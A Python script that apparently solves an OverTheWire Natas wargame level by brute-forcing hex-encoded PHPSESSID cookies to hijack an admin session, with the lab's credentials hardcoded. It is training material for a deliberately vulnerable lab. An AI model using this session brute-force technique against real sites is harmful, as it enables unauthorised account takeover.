import requests
import random

base_url = "http://natas19.natas.labs.overthewire.org/index.php?username=admin&password=admin&debug"

i = 0

tried = []
while True:

    sessid = random.randint(1, 640)
    if(sessid in tried):
        continue
    tried.append(sessid)

    phpsessid = f"{sessid}-admin".encode("utf-8").hex()

    res = requests.get(base_url,
                       auth=("natas19", "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"),
                       cookies={'PHPSESSID': phpsessid})

    if("regular" not in res.text):
        print(res.text)
        break
    else:
        i += 1
        try:
            print("Attempt:", i, "--- PHPSESSID =", phpsessid)
        except:
            pass
